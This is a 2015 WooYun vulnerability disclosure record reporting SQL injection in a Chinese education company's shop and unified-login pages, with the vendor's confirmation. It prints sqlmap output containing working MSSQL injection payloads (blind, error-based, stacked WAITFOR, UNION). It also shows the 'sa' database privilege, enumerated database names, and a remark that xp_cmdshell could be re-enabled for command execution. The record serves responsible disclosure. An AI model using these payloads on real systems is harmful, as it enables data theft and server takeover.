{"id": 84047, "wybug_id": "wooyun-2015-0145956", "wybug_title": "方直金太阳几处漏洞打包", "wybug_corp": "fzjty.com", "wybug_author": "Msyb", "wybug_date": "2015-10-12 11:14", "wybug_open_date": "2015-11-26 19:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向公众公开  简要描述： mssql注入sa权限可执行命令 详细说明：  先看你们的商城http://shop.kingsun.cn/到处都是注入，而且还爆错\n\n\n\n\n\n必须全部好好检查检查统一认证那里也有一个注入...这个就有点严重了\n\n正常\n\n错误明显的bool型盲注\nsqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=admin' AND 4194=4194 AND 'IjGI'='IjGI    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: username=admin';WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008current user:    'sa'\nxpcmdshell貌似没有不过可以用sqlmap重新开一个，可以执行命令\n\n   漏洞证明：  \nuums那里的数据库如下[*] FZ_SyncResourceDB[*] FZStudyAssistant[*] fzweixin[*] master[*] MOD_FZUUMSNEW[*] MOD_SMSPlatform[*] model[*] msdb[*] StudyManager[*] tempdb\nshop的\nsqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:---Parameter: key (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=a%' AND 4781=4781 AND '%'='    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: key=a%' AND 3776=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3776=3776) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(118)+CHAR(113))) AND '%'='    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: key=a%';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: key=a%' WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: key=a%' UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(113)+CHAR(113)+CHAR(71)+CHAR(107)+CHAR(112)+CHAR(81)+CHAR(75)+CHAR(118)+CHAR(89)+CHAR(78)+CHAR(112)+CHAR(89)+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(118)+CHAR(113)-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005available databases [15]:[*] dnt3[*] Familiy[*] fzadv[*] FZAgentDB[*] FZCMS[*] fzgsc[*] gamepark[*] kingsundb[*] KSResource[*] ksshop2[*] master[*] model[*] msdb[*] tempdb[*] web_Date\n未进一步渗透   修复方案：  过滤，转义等。好好检查一下代码。   版权声明：转载请注明来源 Msyb@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-12 19:04 厂商回复： 正在检查和修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}